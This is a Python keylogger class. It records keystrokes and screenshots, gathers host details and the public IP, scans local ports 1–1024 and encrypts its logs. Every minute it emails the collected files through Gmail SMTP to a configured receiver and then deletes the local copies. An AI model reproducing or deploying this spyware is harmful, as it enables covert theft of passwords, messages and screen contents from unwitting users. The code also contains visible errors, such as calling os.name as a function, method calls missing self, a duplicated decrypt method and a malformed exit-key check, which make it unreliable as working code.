import logging
import socket
import platform
import threading
import os
import pyscreenshot
import smtplib
import config

from pynput.keyboard import Key, Listener
from random import randint
from requests import get
from PIL import ImageGrab
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from cryptography.fernet import Fernet

class KeyLog():

  def __init__(self):
    self.LOGS_FILE_DIRECTORY = self.createDir()
    # FILES
    self.sys_info = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'systeminfo.txt')
    self.log_file = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'keylog.txt')
    self.clean_data = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), 'clean-text.txt')
    self.list_of_files = os.listdir(os.path.join(os.getcwd(), self.LOGS_FILE_DIRECTORY))
    # KEYSTROKE LOGGING CONFIG
    logging.basicConfig(filename = (self.log_file), level = logging.DEBUG, format = '%(asctime)s: %(message)s')
    self.writeKey()
          
  # CLASS VARIABLES
  WORKING_OS = os.name()
  REPORT_TIME = 60
  count = 0
  unsorted_data = []
  ENCRYPTION_KEY = ''
  KEY_VALUE = ''
  FROM_ADDR = config.SENDER_EMAIL_ADDR
  TO_ADDR = config.RECEIVER_EMAIL_ADDR  

  # Create New Dir
  def createDir(self):
      newfile = os.path.join(os.getcwd(), str(randint(1111, 9999)) + "logs")
      os.mkdir(newfile, 0o775)
      return newfile

  # KEY CREATION
  def createKey(self):
    cryptKey = Fernet.generate_key()
    return cryptKey
  ENCRYPTION_KEY = createKey()

  # WRITING KEY TO A FILE
  def writeKey(self, cryptKey, key_stored_file):
    with open(key_stored_file, 'wb') as keyFile:
        keyFile.write(cryptKey)
  writeKey(ENCRYPTION_KEY, "KeyValue.key")

  # RETRIEVING KEY 
  def loadKey(self, key_stored_file):
    with open(key_stored_file, 'rb') as keyFile:
        cryptKey = keyFile.read()
    return cryptKey
  KEY_VALUE =  loadKey("KeyValue.key")

  # ENCRYPTING FILE
  def encryptFile(self, cryptKey, file_to_be_encrypted, encrypted_file):
    f = Fernet(cryptKey)
    with open(file_to_be_encrypted, 'rb') as current_file:
        before_encryption = current_file.read()        
    encrypted = f.encrypt(before_encryption)
    with open(encrypted_file, 'wb') as current_file:
        current_file.write(encrypted)

  # DECRYPTING FILE
  def decryptFile(self, cryptKey, file_to_be_decrypted, decrypted_file):
    f = Fernet(cryptKey)
    with open(file_to_be_decrypted, 'rb') as decrypt_file:
        before_decryption = decrypt_file.read()
    decrypted = f.decrypt(before_decryption)
    with open(decrypted_file, 'wb') as decrypt_file:
        decrypt_file.write(decrypted)

  def decryptFile(self, key, file_to_be_decrypted, decrypted_file):
    f = Fernet(key)
    for en_file, de_file in zip(file_to_be_decrypted, decrypted_file):
      with open((os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), en_file)), 'rb') as decrypt_file:
        before_decryption = decrypt_file.read()
      decrypted = f.decrypt(before_decryption)
      with open((os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), de_file)), 'wb') as decrypt_file:
        decrypt_file.write(decrypted)
  
  # FUNCTION CHECKS FOR OPEN PORTS IN THE SYSTEM
  def check_open_port(self, host, port):
    s = socket.socket()
    try:
        s.connect((host, port))
        s.settimeout(1)
    except:
        return False
    else:
        return True

  # CAPTURE SCREENSHOT
  def screenshotWinMacLin(self):
    SAVE_SCREENSHOT = os.path.join(os.path.abspath(self.LOGS_FILE_DIRECTORY), (f'{randint(1,999999999)}screen.png'))
    if self.WORKING_OS == "nt":
      image = ImageGrab.grab(all_screens = True)
      image.save(SAVE_SCREENSHOT, 'PNG')
    else:
      try:    
        captureScreen = pyscreenshot.grab()
        captureScreen.save(SAVE_SCREENSHOT, 'PNG')
      except Exception:
        pass
    self.encryptFile(self.KEY_VALUE, SAVE_SCREENSHOT, SAVE_SCREENSHOT)
  
  # COMPUTER INFORMATION
  def log_computerInfo(self):
    with open(self.sys_info, "w") as sysfile:
      hostname = socket.gethostname()
      IPAddress = socket.gethostbyname(hostname)
      try:
        public_IPAddr = get("https://api.ipify.org").text
        sysfile.write("Public IP Address: " + public_IPAddr)
      except Exception:
        pass
      try:
        sysfile.write("Processor: " + (platform.processor()) + '\n')
        platform_OS = platform.system()
        sysfile.write("System: " + platform_OS + ' ' + platform.version() + '\n')
        sysfile.write("Machine: " + platform.machine() + '\n')
        sysfile.write("Hostname: " + hostname + '\n')
        sysfile.write("Private IP Address: " + IPAddress + '\n')
        # host = socket.gethostbyname(socket.gethostname())
        for port in range(1, 1025):
            if self.check_open_port(IPAddress, port):
                sysfile.write(f"[+] {IPAddress}:{port} is open \r")
            else:
                sysfile.write("")
      except Exception:
        pass
      sysfile.close()
    self.encryptFile(self.KEY_VALUE, self.sys_info, self.sys_info)

  # SENDING MAIL TO VIEWER
  def send_recorded_logs(self, fromaddr, toaddr, filesList):
      fromaddr = config.SENDER_EMAIL_ADDR
      toaddr = config.RECEIVER_EMAIL_ADDR

      msg = MIMEMultipart()
      msg['From'] = fromaddr
      msg['To'] = toaddr
      msg['Subject'] = 'This is the subject of my email'

      body = "Body of email"
      msg.attach(MIMEText(body))

      files_to_be_attached = filesList  # ['keylog.txt', 'sorted-data.txt', 'systeminfo.txt', 'screenshot.png']
      for filename in files_to_be_attached:
          attachment = open(filename, 'rb')
          part = MIMEBase("application", "octet-stream")
          part.set_payload(attachment.read())
          encoders.encode_base64(part)
          part.add_header("Content-Disposition", f"attachment; filename = {filename}")
          msg.attach(part)
      msg = msg.as_string()

      try:
          server = smtplib.SMTP('smtp.gmail.com', 587)
          server.ehlo()
          server.starttls()
          server.login(fromaddr, config.SENDER_PASSWORD)          
          server.sendmail(fromaddr, toaddr, msg)
          server.quit()
          print("Email Sent Successfully")
      except Exception as e:
          print("[-] Something went wrong! ...", e)

  # DELETE ALL RECORDS
  def deleteAllFiles(self):
    path = os.path.abspath(self.LOGS_FILE_DIRECTORY)
    try:
      for file_ in self.list_of_files:
        os.remove(os.path.join(path, file_))
      os.rmdir(path)
    except OSError:
      pass

  # TIMER FOR SENDING LOGS
  def sendLogsAt(self):
    self.decryptFile(self.KEY_VALUE, self.list_of_files, self.list_of_files)
    self.send_recorded_logs(self.FROM_ADDR, self.TO_ADDR, self.list_of_files)
    self.deleteAllFiles()
    setTimer = threading.Timer(self.REPORT_TIME, self.sendLogsAt)
    setTimer.start()

  
  # RECORD KEYSTROKES
  def on_press(self, key):
    logging.info(str(key))
    self.unsorted_data.append(str(key))    
    self.write_file(self.unsorted_data)
    self.unsorted_data = []

  # CHAR KEYSTROKES SAVED TO ANOTHER FILE
  def write_file(self, write_data):
    with open(self.clean_data, "a") as clean_file:
      for key in write_data:
        try:
          clean_key = str(key).replace("'", "")
          if clean_key.find("space") > 1:
            clean_file.write('\n')
          elif clean_key.find("Key") == -1:
            clean_file.write(clean_key)
        except Exception:
          pass
    clean_file.close()
    self.encryptFile(self.KEY_VALUE, self.clean_data, self.clean_data)
  
  # EXIT KEYLOGGER
  def on_release(self, key):
    if key == (Key.ctrl and Key.print_screen and Key.pause):
      self.encryptFile(self.KEY_VALUE, self.log_file, self.log_file)
      return False

  def mainModule(self):
    key_listener = Listener(on_press = self.on_press, on_release = self.on_release)
    with key_listener:
      self.log_computerInfo()
      self.screenshotWinMacLin()
      self.sendLogsAt()
      key_listener.join()
      